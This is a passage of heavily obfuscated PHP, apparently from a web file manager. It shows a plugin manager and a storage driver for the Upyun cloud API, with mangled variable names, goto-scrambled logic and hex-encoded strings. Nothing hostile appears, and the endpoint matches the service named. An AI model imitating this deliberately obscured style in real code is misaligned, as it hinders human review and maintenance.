$_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; Hook::trigger($CŠ„Áîªö¸[2213]); $CÜÇĞË = $this->loadPluginList(); foreach ($CÜÇĞË as $fò‡ÛØ => $b£¶õ±ù¿å) { $f™æ¬£á¦ = $this->appAllow($fò‡ÛØ, $b£¶õ±ù¿å); if (!$f™æ¬£á¦) { continue; } foreach ($b£¶õ±ù¿å[$CŠ„Áîªö¸[2214]] as $f½À“ø÷‘ => $B‡‚ÉçÍ˜) { Hook::bind($f½À“ø÷‘, $B‡‚ÉçÍ˜); } } Hook::trigger($CŠ„Áîªö¸[2215]); Hook::trigger(ACTION); } public function appAllow($A¥–·æ´ñ‡, $Bì§†„ö¨÷, $FÏ§‚ùºÒ— = true) { $AÄšÓ§ˆá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dËéÍóå¼Ê = PLUGIN_DIR . $A¥–·æ´ñ‡ . $AÄšÓ§ˆá[2216]; if (!is_array($Bì§†„ö¨÷) || !is_array($Bì§†„ö¨÷[$AÄšÓ§ˆá[2214]]) || !is_file($dËéÍóå¼Ê) || $Bì§†„ö¨÷[$AÄšÓ§ˆá[683]] != 1) { return !1; } if ($FÏ§‚ùºÒ— && !Action($AÄšÓ§ˆá[2217])->checkAuth($A¥–·æ´ñ‡)) { return !1; } return !0; } public function unInstall($Eóòš•¾…©) { $bÖ‚ãŒª„¬ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eóØ›£…¶ë = $this->loadList($Eóòš•¾…©); if (file_exists(PLUGIN_DIR . $Eóòš•¾…©)) { Hook::apply($Eóòš•¾…© . $bÖ‚ãŒª„¬[2218]); } $this->remove($eóØ›£…¶ë[$bÖ‚ãŒª„¬[367]]); } public function changeStatus($EñËğ°™Ìš, $fĞÇêÕÉ) { $CŞ­Ö†½é£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cô½ìˆ‰ê“ = $this->loadList($EñËğ°™Ìš); if ($fĞÇêÕÉ) { Hook::apply($EñËğ°™Ìš . $CŞ­Ö†½é£[2219]); } $this->update($cô½ìˆ‰ê“[$CŞ­Ö†½é£[367]], array($CŞ­Ö†½é£[2220] => $fĞÇêÕÉ)); } public function appRegist($bÚïœÀµ, $dñ™ËôÜ) { $b¡ÃšõŞÈ³ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bÁ–Íø±¸” = $this->loadList($bÚïœÀµ); if ($bÁ–Íø±¸”) { $this->update($bÁ–Íø±¸”[$b¡ÃšõŞÈ³[367]], array($b¡ÃšõŞÈ³[2214] => $dñ™ËôÜ)); } else { $Fà®ä¡˜¿ï = array($b¡ÃšõŞÈ³[28] => $bÚïœÀµ, $b¡ÃšõŞÈ³[2214] => $dñ™ËôÜ, $b¡ÃšõŞÈ³[683] => 0, $b¡ÃšõŞÈ³[6] => $this->getConfigDefault($bÚïœÀµ)); $this->insert($Fà®ä¡˜¿ï); } } public function getConfigDefault($C‡Ì¤²¡†Á) { $DÚù«İõ±„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e´Æ‡…ãµ™ = array(); $DµïÙˆåğ¬ = $this->getPackageJson($C‡Ì¤²¡†Á); if (!$DµïÙˆåğ¬ && is_array($DµïÙˆåğ¬[$DÚù«İõ±„[2221]])) { return $e´Æ‡…ãµ™; } foreach ($DµïÙˆåğ¬[$DÚù«İõ±„[2221]] as $a¾›Ì×ğÄ® => $EÌœ£æµÓ„) { if (!isset($EÌœ£æµÓ„[$DÚù«İõ±„[359]]) || isset($e´Æ‡…ãµ™[$a¾›Ì×ğÄ®])) { continue; } $e´Æ‡…ãµ™[$a¾›Ì×ğÄ®] = $EÌœ£æµÓ„[$DÚù«İõ±„[359]]; } return $e´Æ‡…ãµ™; } public function getPackageJson($Cœ”ì¸å¬¤) { return Hook::apply($Cœ”ì¸å¬¤ . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2222]); } public function getConfig($fÜãèïÓËº, $f¸¡ÕÈÕ²° = false) { $bŞ†½ã‚Å± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÜÍã–¾ï¯ = array(); $bˆÚ‘Ú˜ğ = $this->loadList($fÜãèïÓËº); if ($bˆÚ‘Ú˜ğ && is_array($bˆÚ‘Ú˜ğ[$bŞ†½ã‚Å±[6]])) { $CÜÍã–¾ï¯ = $bˆÚ‘Ú˜ğ[$bŞ†½ã‚Å±[6]]; } if (!$CÜÍã–¾ï¯ || $f¸¡ÕÈÕ²°) { $CÜÍã–¾ï¯ = $this->getConfigDefault($fÜãèïÓËº); } return $CÜÍã–¾ï¯; } public function setConfig($BŸë¨¹×êç, $EíÆ“¡àÃÁ = false) { goto FÑîìóÕß†; FÑîìóÕß†: $Dƒ»ëµÇèè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a™„£÷•Ì§ = $this->loadList($BŸë¨¹×êç); if (!$a™„£÷•Ì§) { return !1; } goto A¹Ôª™”‘Ê; BÇƒ¦¾ƒ‡Ë: $this->update($a™„£÷•Ì§[$Dƒ»ëµÇèè[367]], array($Dƒ»ëµÇèè[6] => $aÈˆÃ§†Î)); goto b‰½ˆß’‚’; A¹Ôª™”‘Ê: $aÈˆÃ§†Î = $a™„£÷•Ì§[$Dƒ»ëµÇèè[6]]; if ($EíÆ“¡àÃÁ == !1) { $aÈˆÃ§†Î = array(); $EíÆ“¡àÃÁ = $this->getConfigDefault($BŸë¨¹×êç); } foreach ($EíÆ“¡àÃÁ as $c’óÀæ»ïÓ => $bâ‚Î‹ô) { $aÈˆÃ§†Î[$c’óÀæ»ïÓ] = is_string($bâ‚Î‹ô) ? trim($bâ‚Î‹ô) : $bâ‚Î‹ô; } goto BÇƒ¦¾ƒ‡Ë; b‰½ˆß’‚’: } public function viewList() { goto Cê‡ÚÕäŒö; DœÛŸ×æ˜»: return $d¹‚Œ‰Íšì; goto AÉë·§êì‹; Cê‡ÚÕäŒö: $AÃ›‡ù¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cà¦†‰ÍÈ = $this->loadList(); $this->pluginScan($cà¦†‰ÍÈ); goto E¾º¶‹–¼Œ; E¾º¶‹–¼Œ: $cà¦†‰ÍÈ = $this->loadPluginList(); $d¹‚Œ‰Íšì = array(); foreach ($cà¦†‰ÍÈ as $aĞËÔñŠö— => $dÔ³¨ŒŞÀ¦) { unset($dÔ³¨ŒŞÀ¦[$AÃ›‡ù¡[2214]], $dÔ³¨ŒŞÀ¦[$AÃ›‡ù¡[6]]); $AÚÄØï™˜ = PLUGIN_DIR . $dÔ³¨ŒŞÀ¦[$AÃ›‡ù¡[28]] . $AÃ›‡ù¡[2216]; if (!is_file($AÚÄØï™˜)) { continue; } $a½§ˆ“àÅÖ = Hook::apply($dÔ³¨ŒŞÀ¦[$AÃ›‡ù¡[28]] . $AÃ›‡ù¡[2222]); if (is_array($a½§ˆ“àÅÖ)) { $d¹‚Œ‰Íšì[$aĞËÔñŠö—] = array_merge($dÔ³¨ŒŞÀ¦, $a½§ˆ“àÅÖ); } } goto DœÛŸ×æ˜»; AÉë·§êì‹: } private function loadPluginList() { $e”áÄ¯´ç½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÄµ³ó½Ï™ = $this->loadList(); if (strtolower(MOD) == $e”áÄ¯´ç½[2223]) { return $BÄµ³ó½Ï™; } $b¶±á‘ã©Ş = Hook::trigger($e”áÄ¯´ç½[2224], $BÄµ³ó½Ï™); if ($BÄµ³ó½Ï™ && !$b¶±á‘ã©Ş) { die; } return $b¶±á‘ã©Ş ? $b¶±á‘ã©Ş : $BÄµ³ó½Ï™; } private function pluginScan($E¥²ééÄŠ) { $E‰Õïõ‰£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; recursion_dir(PLUGIN_DIR, $CÑÖŸ´Ù, $Aõ¶Ô›áÇŠ, 0); foreach ($CÑÖŸ´Ù as $bçØ‹š ™Ì) { $AÎù§òÁÉÅ = get_path_this($bçØ‹š ™Ì); if (isset($E¥²ééÄŠ[$AÎù§òÁÉÅ]) || !file_exists($bçØ‹š ™Ì . $E‰Õïõ‰£[2225]) || !file_exists($bçØ‹š ™Ì . $E‰Õïõ‰£[2216])) { continue; } Hook::apply($AÎù§òÁÉÅ . $E‰Õïõ‰£[2219]); } } } goto C÷çÕ¤¨ù¹; b½÷É®‘¹: function beforeShutdownFatalError($bƒ¿‡ãâˆ®) { think_exception($bƒ¿‡ãâˆ®); } $_SERVER[$_SERVER[¡Áã][45]] = $cå¡»Ïöâ($_SERVER[$_SERVER[¡Áã][42]]); $fŠÊ÷àÒÌ³ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto dª‹Ğ‘¶öø; fâøõÅ±í: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\x3a\x2f\x2f\x76\60\56\x61\160\x69\56\x75\x70\171\165\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($aåÔÑÁË¥) { parent::__construct(); $this->_init($aåÔÑÁË¥); } public function _init($Aä‡á‡Ìœ¯) { foreach ($Aä‡á‡Ìœ¯ as $AÍ¦Œ‡ËïÑ => $CæÁö‡Øñ) { if (isset($this->{$AÍ¦Œ‡ËïÑ})) { $this->{$AÍ¦Œ‡ËïÑ} = $CæÁö‡Øñ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1240], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($a…»¯Çä‚Í, $AğÈ’¼¡Ğ¬ = "\107\x45\124") { $b÷²¢ïä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B‰ãŠÁ°ª½ = gmdate($b÷²¢ïä[1204]); $aÀÇ’ÀêãŒ = base64_encode(hash_hmac($b÷²¢ïä[1241], "{$AğÈ’¼¡Ğ¬}\x26{$a…»¯Çä‚Í}\x26{$B‰ãŠÁ°ª½}", md5("{$this->userpass}"), !0)); $CÂœŒƒƒƒ‡ = array("\x41\165\x74\150\157\x72\151\x7a\141\164\x69\x6f\156\72\125\120\131\125\116\x20{$this->username}\x3a{$aÀÇ’ÀêãŒ}", "\104\141\x74\145\x3a{$B‰ãŠÁ°ª½}"); return $CÂœŒƒƒƒ‡; } public function ussRequest($c®œÜÙ«Ğƒ, $cé‰ù¼¡÷ã = "\107\105\x54", $A¡‡«¼ÛŠä = false, $b˜šÌŒîÅ = false, $b™£³„ÇÌ– = false) { goto B©•Ñ™õŒ; f¬¦Œ‰œª: $F‘Äˆ¨˜ˆÏ = $this->ussHeaders($f¶¶‚éá™¢, $cé‰ù¼¡÷ã); if ($b˜šÌŒîÅ) { $F‘Äˆ¨˜ˆÏ = array_merge($F‘Äˆ¨˜ˆÏ, $b˜šÌŒîÅ); } $bÒÓ ¹†Ê = url_request($this->endpoint . $f¶¶‚éá™¢, $cé‰ù¼¡÷ã, $A¡‡«¼ÛŠä, $F‘Äˆ¨˜ˆÏ, $b™£³„ÇÌ–); goto DÛ °´·Ø; DÛ °´·Ø: if (!$bÒÓ ¹†Ê) { return array($a¹×ùÌñ‚„[1029] => !1, $a¹×ùÌñ‚„[1031] => $a¹×ùÌñ‚„[1242]); } if (strtolower($cé‰ù¼¡÷ã) == $a¹×ùÌñ‚„[184] || in_array($bÒÓ ¹†Ê[$a¹×ùÌñ‚„[1029]], array($a¹×ùÌñ‚„[1097], $a¹×ùÌñ‚„[1243]))) { $A¡‡«¼ÛŠä = $bÒÓ ¹†Ê[$a¹×ùÌñ‚„[1244]]; } else { $A¡‡«¼ÛŠä = json_decode($bÒÓ ¹†Ê[$a¹×ùÌñ‚„[1031]], !0); if (!$A¡‡«¼ÛŠä) { $A¡‡«¼ÛŠä = $bÒÓ ¹†Ê[$a¹×ùÌñ‚„[1031]]; } else { if (!$bÒÓ ¹†Ê[$a¹×ùÌñ‚„[683]] && isset($A¡‡«¼ÛŠä[$a¹×ùÌñ‚„[1245]])) { $A¡‡«¼ÛŠä = $A¡‡«¼ÛŠä[$a¹×ùÌñ‚„[1245]]; } } } return array($a¹×ùÌñ‚„[1029] => $bÒÓ ¹†Ê[$a¹×ùÌñ‚„[683]], $a¹×ùÌñ‚„[1031] => $A¡‡«¼ÛŠä); goto f•ÕŒªäò; B©•Ñ™õŒ: $a¹×ùÌñ‚„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c®œÜÙ«Ğƒ = trim($c®œÜÙ«Ğƒ, $a¹×ùÌñ‚„[8]); $f¶¶‚éá™¢ = "\x2f{$this->bucket}\57{$c®œÜÙ«Ğƒ}"; goto f¬¦Œ‰œª; f•ÕŒªäò: } public function mkfile($dšÇ„òØÜ†, $DÄ´•Šø™« = '', $E°¶ñ¶Ò¢á = REPEAT_RENAME) { if ($this->setContent($dšÇ„òØÜ†, $DÄ´•Šø™«)) { return $this->getPathOuter($dšÇ„òØÜ†); } return !1; } public function mkdir($F„İ¿ŒÒ¼, $Fø”Š×ó‘ = REPEAT_SKIP) { $B¯äÑ§¦ÎÜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FŠ§¦¢Æåæ = trim($F„İ¿ŒÒ¼, $B¯äÑ§¦ÎÜ[8]); if ($this->_isFolder($FŠ§¦¢Æåæ)) { return $this->getPathOuter($FŠ§¦¢Æåæ); } $aŒ„ÍÉØÔ = array($B¯äÑ§¦ÎÜ[1246]); $a‘¦”ïÓãá = $this->ussRequest($FŠ§¦¢Æåæ, $B¯äÑ§¦ÎÜ[212], !1, $aŒ„ÍÉØÔ); return $a‘¦”ïÓãá[$B¯äÑ§¦ÎÜ[1029]] ? $this->getPathOuter($FŠ§¦¢Æåæ) : !1; } public function copyFile($EØâª²‰–ò, $c«ÄéÍÍÛ) { $D Ú½Â‰Êæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fî†³Ä‚¿Ó = array($D Ú½Â‰Êæ[1247] . "\57{$this->bucket}\57{$EØâª²‰–ò}", $D Ú½Â‰Êæ[1248]); $CÁ†’Ÿ½à• = $this->ussRequest($c«ÄéÍÍÛ, $D Ú½Â‰Êæ[214], !1, $Fî†³Ä‚¿Ó); return $CÁ†’Ÿ½à•[$D Ú½Â‰Êæ[1029]] ? !0 : $this->getPathOuter($c«ÄéÍÍÛ); } public function moveFile($CŠåòŸ¹, $c†İ¿È·âÇ) { $aá¥ê¿ÆêÂ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dğŒÁ‚¡­§ = array($aá¥ê¿ÆêÂ[1249] . "\57{$this->bucket}\x2f{$CŠåòŸ¹}", $aá¥ê¿ÆêÂ[1248]); $B×Ãê§à® = $this->ussRequest($c†İ¿È·âÇ, $aá¥ê¿ÆêÂ[214], !1, $dğŒÁ‚¡­§); return $B×Ãê§à®[$aá¥ê¿ÆêÂ[1029]] ? !0 : $this->getPathOuter($c†İ¿È·âÇ); } public function delFile($C¦Íøğ÷¨) { $D˜…Á¸î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C„ìâ˜íğİ = $this->ussRequest($C¦Íøğ÷¨, $D˜…Á¸î[1250]); return $C„ìâ˜íğİ[$D˜…Á¸î[1029]] ? !0 : !1; } public function delFolder($A‘Óè¾¹³Ö) { $E‰â Ø »Ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A­‡¸ŠŠĞİ = $this->listAll($A‘Óè¾¹³Ö); krsort($A­‡¸ŠŠĞİ); foreach ($A­‡¸ŠŠĞİ as $f•‹Êø™Û) { $this->ussRequest($f•‹Êø™Û[$E‰â Ø »Ï[75]], $E‰â Ø »Ï[1250]); } return $this->ussRequest($A‘Óè¾¹³Ö, $E‰â Ø »Ï[1250]); } public function rename($A¹®­…ŒÚÔ, $B¥Ü§Ûºíä) { if ($this->isFile($A¹®­…ŒÚÔ)) { $B¥Ü§Ûºíä = get_path_father($A¹®­…ŒÚÔ) . $B¥Ü§Ûºíä; return $this->moveFile($A¹®­…ŒÚÔ, $B¥Ü§Ûºíä); } return $this->renameObject($A¹®­…ŒÚÔ, $B¥Ü§Ûºíä); } public function fileInfo($bŒÒ¦™±¨Ï, $BœõÌ²ßğ = false, $aÍêã£Àóñ = array()) { $A©Ë’†¬÷‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($BœõÌ²ßğ) { return array($A©Ë’†¬÷‹[28] => $this->pathThis($bŒÒ¦™±¨Ï), $A©Ë’†¬÷‹[75] => $this->getPathOuter($A©Ë’†¬÷‹[8] . $bŒÒ¦™±¨Ï), $A©Ë’†¬÷‹[29] => $A©Ë’†¬÷‹[167], $A©Ë’†¬÷‹[77] => isset($aÍêã£Àóñ[$A©Ë’†¬÷‹[325]]) ? $aÍêã£Àóñ[$A©Ë’†¬÷‹[325]] : 0, $A©Ë’†¬÷‹[160] => $this->ext($bŒÒ¦™±¨Ï)); } $c—‡Ÿá‰Ü = array($A©Ë’†¬÷‹[28] => $this->pathThis($bŒÒ¦™±¨Ï), $A©Ë’†¬÷‹[75] => $this->getPathOuter($A©Ë’†¬÷‹[8] . $bŒÒ¦™±¨Ï), $A©Ë’†¬÷‹[29] => $A©Ë’†¬÷‹[167], $A©Ë’†¬÷‹[187] => 0, $A©Ë’†¬÷‹[107] => isset($EÎ…¡ï¦¾í[$A©Ë’†¬÷‹[1251]]) ? $EÎ…¡ï¦¾í[$A©Ë’†¬÷‹[1251]] : 0, $A©Ë’†¬÷‹[77] => isset($aÍêã£Àóñ[$A©Ë’†¬÷‹[325]]) ? $aÍêã£Àóñ[$A©Ë’†¬÷‹[325]] : 0, $A©Ë’†¬÷‹[160] => $this->ext($bŒÒ¦™±¨Ï), $A©Ë’†¬÷‹[188] => !0, $A©Ë’†¬÷‹[189] => !0); if (empty($aÍêã£Àóñ)) { $aÍêã£Àóñ = $this->objectMeta($bŒÒ¦™±¨Ï); if (!$aÍêã£Àóñ) { return $c—‡Ÿá‰Ü; } $c—‡Ÿá‰Ü[$A©Ë’†¬÷‹[187]] = $aÍêã£Àóñ[$A©Ë’†¬÷‹[1252]]; $c—‡Ÿá‰Ü[$A©Ë’†¬÷‹[107]] = $aÍêã£Àóñ[$A©Ë’†¬÷‹[1253]]; $c—‡Ÿá‰Ü[$A©Ë’†¬÷‹[77]] = $aÍêã£Àóñ[$A©Ë’†¬÷‹[77]]; } return $c—‡Ÿá‰Ü; } public function folderInfo($aËÕ‡±ò™Â, $FÜ¯Â‚³¾Á = false) { $f«ù¤±¸’™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($FÜ¯Â‚³¾Á) { return array($f«ù¤±¸’™[28] => $this->pathThis($aËÕ‡±ò™Â), $f«ù¤±¸’™[75] => $this->getPathOuter($f«ù¤±¸’™[8] . $aËÕ‡±ò™Â), $f«ù¤±¸’™[29] => $f«ù¤±¸’™[76]); } $A…óë›Áæ  = array($f«ù¤±¸’™[28] => $this->pathThis($aËÕ‡±ò™Â), $f«ù¤±¸’™[75] => $this->getPathOuter($f«ù¤±¸’™[8] . $aËÕ‡±ò™Â), $f«ù¤±¸’™[29] => $f«ù¤±¸’™[76], $f«ù¤±¸’™[187] => 0, $f«ù¤±¸’™[107] => isset($e©ä¶‰‚Ë„[$f«ù¤±¸’™[1251]]) ? $e©ä¶‰‚Ë„[$f«ù¤±¸’™[1251]] : 0, $f«ù¤±¸’™[1161] => !0, $f«ù¤±¸’™[1162] => !0); if (empty($EåÍğÆåÕ)) { $EåÍğÆåÕ = $this->objectMeta($aËÕ‡±ò™Â); if (!$EåÍğÆåÕ) { return $A…óë›Áæ ; } $A…óë›Áæ [$f«ù¤±¸’™[187]] = $EåÍğÆåÕ[$f«ù¤±¸’™[1252]]; $A…óë›Áæ [$f«ù¤±¸’™[107]] = $EåÍğÆåÕ[$f«ù¤±¸’™[1253]]; } return $A…óë›Áæ ; } private function fileList($E³²›í„ª, $Aë´Ò«¼… = 0, $cÜ²Ã¡§Ë = 1000) { $eÁòø„º½Î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DÑäŒõô = array($eÁòø„º½Î[1254], $eÁòø„º½Î[1255] . $cÜ²Ã¡§Ë); if ($Aë´Ò«¼…) { $DÑäŒõô[] = $eÁòø„º½Î[1256] . $Aë´Ò«¼…; } $Böì—‹£» = $this->ussRequest($E³²›í„ª, $eÁòø„º½Î[216], !1, $DÑäŒõô); return !$Böì—‹£»[$eÁòø„º½Î[1029]] ? !1 : $Böì—‹£»[$eÁòø„º½Î[1031]]; } public function listPath($dÅºõš‚÷­, $fÚñ›ëØ¢â = false) { goto B†¶Şù•¢; A×ìÉä‹“¥: return array($fŠ‹ÀößÒˆ[74] => $dÈ¾¤©ë›–, $fŠ‹ÀößÒˆ[73] => $bö±âÑÅÄ•); goto fï¸…Ü™; B†¶Şù•¢: $fŠ‹ÀößÒˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eš¥Í¾£æë = $fŠ‹ÀößÒˆ[33]; $eä˜Ä…¦­á = 1000; goto BÏòå¸ßÁ§; BÏòå¸ßÁ§: $dÈ¾¤©ë›– = $bö±âÑÅÄ• = array(); $cê£òœëù = rtrim($dÅºõš‚÷­, $fŠ‹ÀößÒˆ[8]) . $fŠ‹ÀößÒˆ[8]; while (!0) { $aêÄ×¥ù°è = $this->fileList($dÅºõš‚÷­, $eš¥Í¾£æë, $eä˜Ä…¦­á); if (!$aêÄ×¥ù°è) { return !1; } $eš¥Í¾£æë = isset($aêÄ×¥ù°è[$fŠ‹ÀößÒˆ[1257]]) ? $aêÄ×¥ù°è[$fŠ‹ÀößÒˆ[1257]] : $fŠ‹ÀößÒˆ[33]; $EÅ—‡Â‘Ì• = isset($aêÄ×¥ù°è[$fŠ‹ÀößÒˆ[1258]]) ? $aêÄ×¥ù°è[$fŠ‹ÀößÒˆ[1258]] : array(); foreach ($EÅ—‡Â‘Ì• as $B„¥ŠÑ¹‡) { if ($B„¥ŠÑ¹‡[$fŠ‹ÀößÒˆ[29]] == $fŠ‹ÀößÒˆ[76]) { $dÈ¾¤©ë›–[] = $this->folderInfo($cê£òœëù . $B„¥ŠÑ¹‡[$fŠ‹ÀößÒˆ[28]], $fÚñ›ëØ¢â, $B„¥ŠÑ¹‡); } else { $bö±âÑÅÄ•[] = $this->fileInfo($cê£òœëù . $B„¥ŠÑ¹‡[$fŠ‹ÀößÒˆ[28]], $fÚñ›ëØ¢â, $B„¥ŠÑ¹‡); } } if (count($EÅ—‡Â‘Ì•) < $eä˜Ä…¦­á) { break; } } goto A×ìÉä‹“¥; fï¸…Ü™: } private function recursionAllFiles($CÁÉà»Í¾„, &$AÔ³ÜÚËåĞ) { $FƒÊ¬æ«¥Õ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E›à°Ï›“— = $FƒÊ¬æ«¥Õ[33]; $fƒ…´²äá = 1000; $B‰ÙƒâˆöŠ = $eè †Ê¢®§ = array(); $dÕÊ¼¡„» = rtrim($CÁÉà»Í¾„, $FƒÊ¬æ«¥Õ[8]) . $FƒÊ¬æ«¥Õ[8]; while (!0) { $F¨¿Ò‘Ø†» = $this->fileList($CÁÉà»Í¾„, $E›à°Ï›“—, $fƒ…´²äá); if (!$F¨¿Ò‘Ø†») { return !1; } $E›à°Ï›“— = isset($F¨¿Ò‘Ø†»[$FƒÊ¬æ«¥Õ[1257]]) ? $F¨¿Ò‘Ø†»[$FƒÊ¬æ«¥Õ[1257]] : $FƒÊ¬æ«¥Õ[33]; $cŒ¼µæ‹¹ = isset($F¨¿Ò‘Ø†»[$FƒÊ¬æ«¥Õ[1258]]) ? $F¨¿Ò‘Ø†»[$FƒÊ¬æ«¥Õ[1258]] : array(); foreach ($cŒ¼µæ‹¹ as $EÑæ¦ÈÏæñ) { $f³ŒŸ§£êé = array($FƒÊ¬æ«¥Õ[75] => $dÕÊ¼¡„» . $EÑæ¦ÈÏæñ[$FƒÊ¬æ«¥Õ[28]], $FƒÊ¬æ«¥Õ[76] => $EÑæ¦ÈÏæñ[$FƒÊ¬æ«¥Õ[29]] == $FƒÊ¬æ«¥Õ[76] ? 1 : 0, $FƒÊ¬æ«¥Õ[77] => isset($EÑæ¦ÈÏæñ[$FƒÊ¬æ«¥Õ[325]]) ? $EÑæ¦ÈÏæñ[$FƒÊ¬æ«¥Õ[325]] : 0); $AÔ³ÜÚËåĞ[] = $f³ŒŸ§£êé; if ($f³ŒŸ§£êé[$FƒÊ¬æ«¥Õ[76]] == 1) { $this->recursionAllFiles($f³ŒŸ§£êé[$FƒÊ¬æ«¥Õ[75]], $AÔ³ÜÚËåĞ); } } if (count($cŒ¼µæ‹¹) < $fƒ…´²äá) { break; } } } public function has($aë™á¯ÏÜÚ, $f£™éÈ®› = false, $AÔ‹‡¨ËÍœ = true) { goto eøë×¿¼Õ; eøë×¿¼Õ: $aœ—Ì«Ñ½® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e™Î°œÊé = $aœ—Ì«Ñ½®[33]; $fÅ¶‰îˆ•¦ = 1000; goto CµÏì¹Âñ; eÔ½ê²’™: while (!0) { $eÑô•…¨› = $this->fileList($aë™á¯ÏÜÚ, $e™Î°œÊé, $fÅ¶‰îˆ•¦); if (!$eÑô•…¨›) { return !1; } $e™Î°œÊé = isset($eÑô•…¨›[$aœ—Ì«Ñ½®[1257]]) ? $eÑô•…¨›[$aœ—Ì«Ñ½®[1257]] : $aœ—Ì«Ñ½®[33]; $DÏñ˜¯ÙŸÌ = isset($eÑô•…¨›[$aœ—Ì«Ñ½®[1258]]) ? $eÑô•…¨›[$aœ—Ì«Ñ½®[1258]] : array(); if (empty($DÏñ˜¯ÙŸÌ)) { break; } $cŸº‘áŠÎÈ = array_to_keyvalue($DÏñ˜¯ÙŸÌ, $aœ—Ì«Ñ½®[33], $aœ—Ì«Ñ½®[29]); $C§å‡°‰‚‰ = array_count_values($cŸº‘áŠÎÈ); $F”±ñèŠÛ = isset($C§å‡°‰‚‰[$aœ—Ì«Ñ½®[76]]) ? $C§å‡°‰‚‰[$aœ—Ì«Ñ½®[76]] : 0; $Cã‡æÕĞõÛ = count($cŸº‘áŠÎÈ) - $F”±ñèŠÛ; if ($f£™éÈ®›) { $DÜ‹°ÓÔ‰Â += $F”±ñèŠÛ; $eÍÅÍ–‡ö¡ += $Cã‡æÕĞõÛ; if ($EØô×á¹Şù < $fÅ¶‰îˆ•¦) { break; } continue; } if ($AÔ‹‡¨ËÍœ) { if ($Cã‡æÕĞõÛ) { return !0; } } else { if ($F”±ñèŠÛ) { return !0; } } if (count($DÏñ˜¯ÙŸÌ) < $fÅ¶‰îˆ•¦) { break; } } if ($f£™éÈ®›) { return array($aœ—Ì«Ñ½®[191] => $eÍÅÍ–‡ö¡, $aœ—Ì«Ñ½®[192] => $DÜ‹°ÓÔ‰Â); } return !1; goto bÚ©†ğ™º; CµÏì¹Âñ: $eÍÅÍ–‡ö¡ = 0; $DÜ‹°ÓÔ‰Â = 0; $Bå¸¡ŠñÁ = rtrim($aë™á¯ÏÜÚ, $aœ—Ì«Ñ½®[8]) . $aœ—Ì«Ñ½®[8]; goto eÔ½ê²’™; bÚ©†ğ™º: } public function listAll($a‘ù÷¸ôÌÍ) { $bİÃö»Ìõ = array(); $this->recursionAllFiles($a‘ù÷¸ôÌÍ, $bİÃö»Ìõ); return $bİÃö»Ìõ; } public function canRead($cÅĞ­Ê–Õ) { return $this->exist($cÅĞ­Ê–Õ) ? !0 : !1; } public function canWrite($c¨ˆŒİµ‚) { return $this->exist($c¨ˆŒİµ‚) ? !0 : !1; } public function getContent($fÑí®Ê­ñ‹) { return $this->fileSubstr($fÑí®Ê­ñ‹, 0, -1); } public function setContent($C–¶¦é˜òº, $fº·‰‰‡˜Å = '') { $B®‚Åç¡® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$fº·‰‰‡˜Å) { $B¿ó¶‘™º‚ = $this->ussRequest($C–¶¦é˜òº, $B®‚Åç¡®[212]); return $B¿ó¶‘™º‚[$B®‚Åç¡®[1029]]; } $B®¦Ù½² = $this->tempFile($this->pathThis($C–¶¦é˜òº)); file_put_contents($B®¦Ù½², $fº·‰‰‡˜Å); if ($this->upload($C–¶¦é˜òº, $B®¦Ù½²)) { $this->tempFileRemve($B®¦Ù½²); return !0; } return !1; } public function fileSubstr($D©–¹ï×Æç, $f°ˆØô“Éî, $däŸÛôÕ÷İ) { $C–™ùÊÇ”Ç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!($Aˆäƒ”—å… = $this->link($D©–¹ï×Æç))) { return !1; } $c­»á¬š¸ù = !1; if ($däŸÛôÕ÷İ > 0) { $e÷£¹ˆĞÀ = $f°ˆØô“Éî + $däŸÛôÕ÷İ - 1; $c­»á¬š¸ù = array($C–™ùÊÇ”Ç[1219] . $f°ˆØô“Éî . $C–™ùÊÇ”Ç[412] . $e÷£¹ˆĞÀ); } $aªïÀñó› = url_request($Aˆäƒ”—å…, $C–™ùÊÇ”Ç[216], !1, $c­»á¬š¸ù); return $aªïÀñó›[$C–™ùÊÇ”Ç[683]] ? $aªïÀñó›[$C–™ùÊÇ”Ç[1031]] : !1; } public function upload($EŒİäîø×ì, $D™Ú‘˜‰ĞÎ, $F´‡·çáÔÖ = false, $dµøÅ·ÖĞ = REPEAT_REPLACE) { goto Dö¹ÆŸ’Ìä; dŞ Õç: $aàÄÒÊ‰‡ = 